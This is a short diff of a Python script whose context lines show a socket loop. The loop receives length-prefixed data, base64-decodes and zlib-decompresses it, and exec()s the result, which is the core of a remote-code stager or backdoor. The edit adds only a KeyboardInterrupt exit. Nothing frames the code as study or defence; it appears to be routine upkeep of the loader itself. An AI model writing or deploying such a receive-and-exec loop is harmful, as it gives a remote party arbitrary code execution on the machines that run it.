@@ -18,6 +18,8 @@ while True:
         while len(d)<l:
             d+=s.recv(l-len(d))
         exec(zlib.decompress(base64.b64decode(d)),{'s':s})
+    except KeyboardInterrupt:
+        exit()
     except Exception as e:
         print("e2", str(e))
         if ("WinError 10057" in str(e)):
